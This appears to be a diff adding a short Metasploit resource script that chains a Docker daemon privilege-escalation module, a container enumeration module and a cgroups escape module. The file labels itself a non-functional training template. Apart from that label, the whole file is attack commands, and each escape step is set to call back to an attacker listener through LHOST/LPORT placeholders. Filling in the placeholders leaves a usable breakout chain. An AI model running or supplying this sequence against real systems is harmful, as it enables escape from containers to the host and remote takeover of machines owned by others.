@@ -1,0 +1,18 @@
+# Docker Container Escape Template
+# For Training Use – Non-functional Template
+
+use exploit/linux/local/docker_daemon_privilege_escalation
+set SESSION <SESSION_ID>
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
+
+use post/linux/gather/enum_containers
+set SESSION <SESSION_ID>
+run
+
+use exploit/linux/local/docker_cgroups_escape
+set SESSION <SESSION_ID>
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
